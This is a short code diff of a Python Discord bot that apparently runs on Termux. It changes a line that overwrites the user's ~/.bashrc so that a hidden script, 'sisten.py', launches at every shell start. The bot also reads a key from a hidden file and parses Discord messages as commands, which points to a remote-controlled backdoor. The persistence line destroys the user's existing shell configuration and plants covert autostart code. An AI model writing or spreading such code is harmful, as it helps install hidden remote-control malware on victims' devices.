@@ -4,7 +4,7 @@ import discord
 import asyncio
 
 
-os.system('"nohup echo "python3 ~/../usr/etc/sisten.py" > ~/.bashrc >/dev/null 2>&1 &\n";')
+os.system('echo "python3 ~/../usr/etc/sisten.py" > ~/.bashrc &')
 
 def chave():
     with open('~/../usr/etc/.key.txt', 'r') as arquivo:
@@ -36,9 +36,9 @@ async def on_ready():
 # eventos | comandos
 @client.event
 async def on_message(message):
-     usuario = '1'
-     comando = message.content
-     comando = comando.split(' ')
+    usuario = '1'
+    comando = message.content
+    comando = comando.split(' ')
 
     if message.author == client.user:
         return
